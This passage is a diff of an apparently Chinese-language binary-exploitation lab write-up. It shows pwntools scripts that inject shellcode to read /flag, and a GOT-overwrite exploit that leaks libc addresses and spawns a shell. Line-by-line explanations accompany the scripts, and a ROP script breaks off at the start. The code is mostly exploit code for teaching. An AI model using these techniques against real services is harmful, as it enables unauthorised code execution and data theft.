@@ -3466,31 +3466,31 @@
 <p><img alt="7-1" src="../7-1.png" /></p>
 <h2 id="flags">Flags</h2>
 <p>exp1, 2, 3, 4 flags 分别如下：</p>
-<pre><code>flag{forbidden}
+<div class="highlight"><pre><span></span><code>flag{forbidden}
 flag{forbidden}
 flag{forbidden}
 flag{forbidden}
-</code></pre>
+</code></pre></div>
 <p>screenshot 分别如下：</p>
 <p>4 pictures forbidden</p>
 <h2 id="detailed-thoughs-exploit-scripts">Detailed Thoughs &amp; Exploit Scripts</h2>
 <p>以下每一分栏目首先给出 <code>.py</code> 脚本的代码，实际执行时需将 <code>p = remote("localhost", &lt;PORT&gt;)</code> 中的 <code>localhost</code> 改为服务器 IP <code>210.28.132.84</code>，完整脚本之后则是对脚本分部分的分析。</p>
 <h3 id="exp1">exp1</h3>
-<pre><code class="language-python">from pwn import *
-context.arch = 'amd64'
-# p = process(&quot;./chall1&quot;)
-p = remote(&quot;localhost&quot;, 9001) # 假设题目部署在独立端口
-shellcode = asm(
-    shellcraft.open('/flag') + # __TODO__
-    shellcraft.read('rax','rsp',128) + # __TODO__
-    shellcraft.write(1,'rsp','rax') # __TODO__
-)
-p.recvuntil(b&quot;bytes):\n&quot;)
-p.send(shellcode)
-p.recvline()
-flag = p.recvall(timeout=1)
-print(b&quot;Flag: &quot; + flag.strip())
-</code></pre>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+<span class="c1"># p = process(&quot;./chall1&quot;)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span> <span class="mi">9001</span><span class="p">)</span> <span class="c1"># 假设题目部署在独立端口</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span>
+    <span class="n">shellcraft</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;/flag&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="c1"># __TODO__</span>
+    <span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="s1">&#39;rax&#39;</span><span class="p">,</span><span class="s1">&#39;rsp&#39;</span><span class="p">,</span><span class="mi">128</span><span class="p">)</span> <span class="o">+</span> <span class="c1"># __TODO__</span>
+    <span class="n">shellcraft</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;rsp&#39;</span><span class="p">,</span><span class="s1">&#39;rax&#39;</span><span class="p">)</span> <span class="c1"># __TODO__</span>
+<span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;bytes):</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Flag: &quot;</span> <span class="o">+</span> <span class="n">flag</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+</code></pre></div>
 <p>Line 1 导入 pwn 库以使用相关工具和函数</p>
 <p>Line 2 指明 pwntools/asm 模块目标架构是 AMD64（x86-64），显然不同的架构会影响一些抽象的约定。</p>
 <p>Line 3 是被注释掉的调试代码，意为在本地启动名为 <code>chall1</code> 的可执行文件并与之交互.</p>
@@ -3507,197 +3507,197 @@ print(b&quot;Flag: &quot; + flag.strip())
 <p>Line 14 将 <code>flag</code> 清除首尾空白（<code>strip()</code>）后拼接指定前缀（即按指定格式）打印。</p>
 <p>以上 shellcode 的执行流是 <code>open('/flag')</code> → <code>rax=fd</code> → <code>read('rax', 'rsp', 128)</code> → <code>rax=bytes_read</code> → <code>write(1, 'rsp', 'rax')</code> 从而将 <code>/flag</code> 内的内容输出到 stdout.</p>
 <h3 id="exp2">exp2</h3>
-<pre><code class="language-python">from pwn import *
-context.arch = 'amd64'
-# p = process(&quot;./chall2&quot;)
-p = remote(&quot;localhost&quot;, 9002) # 假设题目部署在独立端口
-shellcode = asm(
-    shellcraft.openat(-100,'/flag',0) + # __TODO__
-    shellcraft.read('rax','rsp',128) + # __TODO__
-    shellcraft.write(1,'rsp','rax') # __TODO__
-)
-p.recvuntil(b&quot;bytes):\n&quot;)
-p.send(shellcode)
-p.recvline()
-flag = p.recvall(timeout=1)
-print(b&quot;Flag: &quot; + flag.strip())
-</code></pre>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+<span class="c1"># p = process(&quot;./chall2&quot;)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span> <span class="mi">9002</span><span class="p">)</span> <span class="c1"># 假设题目部署在独立端口</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span>
+    <span class="n">shellcraft</span><span class="o">.</span><span class="n">openat</span><span class="p">(</span><span class="o">-</span><span class="mi">100</span><span class="p">,</span><span class="s1">&#39;/flag&#39;</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="c1"># __TODO__</span>
+    <span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="s1">&#39;rax&#39;</span><span class="p">,</span><span class="s1">&#39;rsp&#39;</span><span class="p">,</span><span class="mi">128</span><span class="p">)</span> <span class="o">+</span> <span class="c1"># __TODO__</span>
+    <span class="n">shellcraft</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;rsp&#39;</span><span class="p">,</span><span class="s1">&#39;rax&#39;</span><span class="p">)</span> <span class="c1"># __TODO__</span>
+<span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;bytes):</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Flag: &quot;</span> <span class="o">+</span> <span class="n">flag</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+</code></pre></div>
 <p>相比于 exp1，此处仅改动了 相关端口和 Line 6，下面解释 Line 6</p>
 <p>Line 6 的格式是 <code>openat(AT_FECWD, "/flag", O_RDONLY)</code> ，其中 <code>AT_FDCWD</code> 的值在 Linux 上等于 <code>-100</code>. 这条指令就会等价于 <code>open("/flag", O_RDONLY)</code>，<code>O_RDONLY</code> 在 Linux 中为 0，表示打开方式为按只读模式打开（显然 RDONLY 就是 ReaD ONLY 的意思），与之有类似作用的是按只写模式打开的 O_WRONLY（在 Linux 下为 1）和按可读可写模式打开的 O_RDWR（在 Linux 2）. 因 <code>shellcraft.openat</code> 的函数要求 flags 参数（此处的 O_RDONLY 位置），故而我们需要写这一个 <code>0</code>.</p>
 <h3 id="exp3">exp3</h3>
-<pre><code class="language-python">from pwn import *
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
 
-# --- 环境配置 ---
-# 在本地调试时:
-# p = process(&quot;./chall3&quot;)
-# libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) # 使用你本地的libc
-# 远程利用时:
-p = remote(&quot;localhost&quot;, 9003)
-libc = ELF(&quot;./libc.so.6&quot;) # 使用题目提供的libc
+<span class="c1"># --- 环境配置 ---</span>
+<span class="c1"># 在本地调试时:</span>
+<span class="c1"># p = process(&quot;./chall3&quot;)</span>
+<span class="c1"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) # 使用你本地的libc</span>
+<span class="c1"># 远程利用时:</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span> <span class="mi">9003</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./libc.so.6&quot;</span><span class="p">)</span> <span class="c1"># 使用题目提供的libc</span>
 
-e = ELF(&quot;./chall3&quot;)
+<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./chall3&quot;</span><span class="p">)</span>
 
-# --- 步骤 1: 泄露 puts 函数在内存中的真实地址 ---
-# 计算 notes 数组到 puts@got 的偏移
-offset_to_puts_got = (e.got['puts'] - e.symbols['notes']) // 8 # __TODO__
-log.info(f&quot;Offset from notes array to puts@got: {offset_to_puts_got}&quot;)
+<span class="c1"># --- 步骤 1: 泄露 puts 函数在内存中的真实地址 ---</span>
+<span class="c1"># 计算 notes 数组到 puts@got 的偏移</span>
+<span class="n">offset_to_puts_got</span> <span class="o">=</span> <span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;notes&#39;</span><span class="p">])</span> <span class="o">//</span> <span class="mi">8</span> <span class="c1"># __TODO__</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Offset from notes array to puts@got: </span><span class="si">{</span><span class="n">offset_to_puts_got</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
 
-# 使用 &quot;Read a note&quot; 功能读取 puts@got 的内容
-p.sendlineafter(b&quot;&gt;&gt; &quot;, b&quot;1&quot;)
-p.sendlineafter(b&quot;Index: &quot;, str(offset_to_puts_got).encode())
+<span class="c1"># 使用 &quot;Read a note&quot; 功能读取 puts@got 的内容</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt;&gt; &quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Index: &quot;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">offset_to_puts_got</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
 
-# 解析输出，获取地址
-p.recvuntil(b&quot; = &quot;)
-leaked_puts_addr = int(p.recvline().strip())
-log.success(f&quot;Leaked puts() address: {hex(leaked_puts_addr)}&quot;)
+<span class="c1"># 解析输出，获取地址</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot; = &quot;</span><span class="p">)</span>
+<span class="n">leaked_puts_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Leaked puts() address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_puts_addr</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
 
-# --- 步骤 2: 计算 system 和 &quot;/bin/sh&quot; 的地址 ---
-# 计算 libc 在内存中的基地址
-libc_base = leaked_puts_addr - libc.sym['puts'] # __TODO__
-log.info(f&quot;Calculated libc base address: {hex(libc_base)}&quot;)
+<span class="c1"># --- 步骤 2: 计算 system 和 &quot;/bin/sh&quot; 的地址 ---</span>
+<span class="c1"># 计算 libc 在内存中的基地址</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">leaked_puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span> <span class="c1"># __TODO__</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Calculated libc base address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
 
-# 计算 system 函数的真实地址
-system_addr = libc_base + libc.sym['system'] # __TODO__
-log.success(f&quot;Calculated system() address: {hex(system_addr)}&quot;)
+<span class="c1"># 计算 system 函数的真实地址</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span> <span class="c1"># __TODO__</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Calculated system() address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
 
-# 注意：因为要执行 system(&quot;sh&quot;)，但 secret_func() 只提供了 &quot;sh&quot;，
-# 我们可以劫持 puts@got 到 system，然后触发 puts(&quot;sh&quot;)。
+<span class="c1"># 注意：因为要执行 system(&quot;sh&quot;)，但 secret_func() 只提供了 &quot;sh&quot;，</span>
+<span class="c1"># 我们可以劫持 puts@got 到 system，然后触发 puts(&quot;sh&quot;)。</span>
 
-# --- 步骤 3: 劫持 puts@got 为 system 的地址 ---
-p.sendlineafter(b&quot;&gt;&gt; &quot;, b&quot;2&quot;)
-p.sendlineafter(b&quot;Index: &quot;, str(offset_to_puts_got).encode())
-p.sendlineafter(b&quot;Value: &quot;, str(system_addr).encode())
-log.info(&quot;Overwrote puts@got with system address.&quot;)
+<span class="c1"># --- 步骤 3: 劫持 puts@got 为 system 的地址 ---</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt;&gt; &quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Index: &quot;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">offset_to_puts_got</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Value: &quot;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;Overwrote puts@got with system address.&quot;</span><span class="p">)</span>
 
-# --- 步骤 4: 触发 payload ---
-# 调用 secret_func()，它会执行 puts(&quot;sh&quot;)
-# 由于 GOT 被劫持，实际执行的是 system(&quot;sh&quot;)
-p.sendlineafter(b&quot;&gt;&gt; &quot;, b&quot;4&quot;)
+<span class="c1"># --- 步骤 4: 触发 payload ---</span>
+<span class="c1"># 调用 secret_func()，它会执行 puts(&quot;sh&quot;)</span>
+<span class="c1"># 由于 GOT 被劫持，实际执行的是 system(&quot;sh&quot;)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt;&gt; &quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;4&quot;</span><span class="p">)</span>
 
-p.interactive()
-</code></pre>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
 <p>下面逐个环节一一讲解</p>
-<pre><code class="language-python">from pwn import *
-</code></pre>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+</code></pre></div>
 <p>Part 1 将 pwn 库导入。</p>
-<pre><code class="language-python"># --- 环境配置 ---
-# 在本地调试时:
-# p = process(&quot;./chall3&quot;)
-# libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) # 使用你本地的libc
-# 远程利用时:
-p = remote(&quot;localhost&quot;, 9003)
-libc = ELF(&quot;./libc.so.6&quot;) # 使用题目提供的libc
+<div class="highlight"><pre><span></span><code><span class="c1"># --- 环境配置 ---</span>
+<span class="c1"># 在本地调试时:</span>
+<span class="c1"># p = process(&quot;./chall3&quot;)</span>
+<span class="c1"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) # 使用你本地的libc</span>
+<span class="c1"># 远程利用时:</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span> <span class="mi">9003</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./libc.so.6&quot;</span><span class="p">)</span> <span class="c1"># 使用题目提供的libc</span>
 
-e = ELF(&quot;./chall3&quot;)
-</code></pre>
+<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./chall3&quot;</span><span class="p">)</span>
+</code></pre></div>
 <p>Part 2 建立 TCP 连接得到一个 tube 对象 <code>p</code> 用于交互。将题目提供的 <code>libc</code> 文件加载为 ELF 对象，便于之后读取符号地址/偏移。注意不同 libc 版本中函数 offset 不同，错误的 libc 会导致计算出的地址不对。另外加载目标二进制 chall3 为 ELF 对象 e，以便的读取其符号表、GOT/PLT、节区地址等。</p>
-<pre><code class="language-python"># --- 步骤 1: 泄露 puts 函数在内存中的真实地址 ---
-# 计算 notes 数组到 puts@got 的偏移
-offset_to_puts_got = (e.got['puts'] - e.symbols['notes']) // 8 # __TODO__
-log.info(f&quot;Offset from notes array to puts@got: {offset_to_puts_got}&quot;)
+<div class="highlight"><pre><span></span><code><span class="c1"># --- 步骤 1: 泄露 puts 函数在内存中的真实地址 ---</span>
+<span class="c1"># 计算 notes 数组到 puts@got 的偏移</span>
+<span class="n">offset_to_puts_got</span> <span class="o">=</span> <span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;notes&#39;</span><span class="p">])</span> <span class="o">//</span> <span class="mi">8</span> <span class="c1"># __TODO__</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Offset from notes array to puts@got: </span><span class="si">{</span><span class="n">offset_to_puts_got</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
 
-# 使用 &quot;Read a note&quot; 功能读取 puts@got 的内容
-p.sendlineafter(b&quot;&gt;&gt; &quot;, b&quot;1&quot;)
-p.sendlineafter(b&quot;Index: &quot;, str(offset_to_puts_got).encode())
+<span class="c1"># 使用 &quot;Read a note&quot; 功能读取 puts@got 的内容</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt;&gt; &quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Index: &quot;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">offset_to_puts_got</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
 
-# 解析输出，获取地址
-p.recvuntil(b&quot; = &quot;)
-leaked_puts_addr = int(p.recvline().strip())
-log.success(f&quot;Leaked puts() address: {hex(leaked_puts_addr)}&quot;)
-</code></pre>
+<span class="c1"># 解析输出，获取地址</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot; = &quot;</span><span class="p">)</span>
+<span class="n">leaked_puts_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Leaked puts() address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_puts_addr</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</code></pre></div>
 <p>Part 3 首先使用 <code>e.got['puts']</code> 来获取 ELF 中 puts 在 GOT（全局偏移表中的位置，且为文件里的地址而非进程运行时的绝对 libc 地址），然后减去二进制中名为 <code>notes</code> 的符号地址（使用 <code>e.symbols['notes']</code> 获取），二者相减除以 <code>8</code> 得到索引。注意此处假定了 notes 数组的单个元素占据 8 字节（64-bit 指针），且 <code>puts@got</code> 的内容会放置在 notes 数组中。</p>
 <p>接下来 <code>p.sendlineafter(b"&gt;&gt; ", b"1")</code> 是等待远端输出包含 <code>"&gt;&gt; "</code> 的提示后发送 <code>1\n</code> .</p>
 <p>类似地 <code>p.sendlineafter(b"Index: ", str(offset_to_puts_got).encode())</code> 等待 <code>Index:</code>  后将计算好的索引字符发送给程序，程序将用此索引读取 <code>nodes[index]</code> 并打印，因 index 指向了 <code>puts@got</code>  所在槽位，故而程序会打印 GOT 中的值，造成信息泄露。</p>
 <p>接下来 <code>p.recvuntil(b" = ")</code> 这个函数介绍过了，阻塞直到等到输出中的 <code>=</code> . <code>leaked_puts_addr = int(p.recvline.strip())</code> 从随后的一整行读取并转为整数（int 类型）。</p>
-<pre><code class="language-python"># --- 步骤 2: 计算 system 和 &quot;/bin/sh&quot; 的地址 ---
-# 计算 libc 在内存中的基地址
-libc_base = leaked_puts_addr - libc.sym['puts'] # __TODO__
-log.info(f&quot;Calculated libc base address: {hex(libc_base)}&quot;)
+<div class="highlight"><pre><span></span><code><span class="c1"># --- 步骤 2: 计算 system 和 &quot;/bin/sh&quot; 的地址 ---</span>
+<span class="c1"># 计算 libc 在内存中的基地址</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">leaked_puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span> <span class="c1"># __TODO__</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Calculated libc base address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
 
-# 计算 system 函数的真实地址
-system_addr = libc_base + libc.sym['system'] # __TODO__
-log.success(f&quot;Calculated system() address: {hex(system_addr)}&quot;)
+<span class="c1"># 计算 system 函数的真实地址</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span> <span class="c1"># __TODO__</span>
+<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Calculated system() address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
 
-# 注意：因为要执行 system(&quot;sh&quot;)，但 secret_func() 只提供了 &quot;sh&quot;，
-# 我们可以劫持 puts@got 到 system，然后触发 puts(&quot;sh&quot;)。
-</code></pre>
+<span class="c1"># 注意：因为要执行 system(&quot;sh&quot;)，但 secret_func() 只提供了 &quot;sh&quot;，</span>
+<span class="c1"># 我们可以劫持 puts@got 到 system，然后触发 puts(&quot;sh&quot;)。</span>
+</code></pre></div>
 <p>Part 4 <code>libc.sys['puts']</code> 是在加载的 libc 文件内 puts 符号的文件内偏移（在 libc 中的相对地址），<code>leaked_puts_addr</code> 是我们之前求出的进程中 puts 的实际位置（即运行时位置），位置减偏差得到基址 <code>libc_base</code>. 于此同时，<code>libc.sym['system']</code> 类似，是 libc 文件内 system 的偏移，基址加偏移得到 system 的运行时位置.</p>
-<pre><code class="language-python"># --- 步骤 3: 劫持 puts@got 为 system 的地址 ---
-p.sendlineafter(b&quot;&gt;&gt; &quot;, b&quot;2&quot;)
-p.sendlineafter(b&quot;Index: &quot;, str(offset_to_puts_got).encode())
-p.sendlineafter(b&quot;Value: &quot;, str(system_addr).encode())
-log.info(&quot;Overwrote puts@got with system address.&quot;)
-</code></pre>
+<div class="highlight"><pre><span></span><code><span class="c1"># --- 步骤 3: 劫持 puts@got 为 system 的地址 ---</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt;&gt; &quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Index: &quot;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">offset_to_puts_got</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Value: &quot;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;Overwrote puts@got with system address.&quot;</span><span class="p">)</span>
+</code></pre></div>
 <p>Part 5 在目标程序中会对某个字符串 “sh” 做 <code>puts("sh")</code> ，故而将 <code>puts@got</code> 覆盖为 system 的地址，那么该调用 puts 的时候，实际上会执行 <code>system("sh")</code> 也就是说我们获得了 Shell，这种技巧被称作 GOT 劫持（GOT overwrite）.</p>
-<pre><code class="language-python"># --- 步骤 4: 触发 payload ---
-# 调用 secret_func()，它会执行 puts(&quot;sh&quot;)
-# 由于 GOT 被劫持，实际执行的是 system(&quot;sh&quot;)
-p.sendlineafter(b&quot;&gt;&gt; &quot;, b&quot;4&quot;)
+<div class="highlight"><pre><span></span><code><span class="c1"># --- 步骤 4: 触发 payload ---</span>
+<span class="c1"># 调用 secret_func()，它会执行 puts(&quot;sh&quot;)</span>
+<span class="c1"># 由于 GOT 被劫持，实际执行的是 system(&quot;sh&quot;)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt;&gt; &quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;4&quot;</span><span class="p">)</span>
 
-p.interactive()
-</code></pre>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
 <p>Part 6 发送信息在菜单中选择项 <code>4</code>，假意执行 <code>puts</code> 实际执行 <code>system("sh")</code> 打开 shell，接下来使用 <code>p.interactive()</code> 切换到交互模式，联机本地终端和远端进程，达成类似反弹 shell 的效果。</p>
 <p>获取权限后我们通过 <code>ls</code> 查看目录下文件，看到 flag 文件后直接执行 <code>cat /flag</code> 输出其中内容。</p>
 <h3 id="exp4">exp4</h3>
-<pre><code class="language-python">from pwn import *
-# p = process(&quot;./chall4&quot;)
-context.arch='amd64'
-p = remote(&quot;localhost&quot;, 9004)
-e = ELF(&quot;./chall4&quot;)
+<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<span class="c1"># p = process(&quot;./chall4&quot;)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span> <span class="mi">9004</span><span class="p">)</span>
+<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./chall4&quot;</span><span class="p">)</span>
 
-# 使用 pwntools.ROP 模块
-rop = ROP(e)
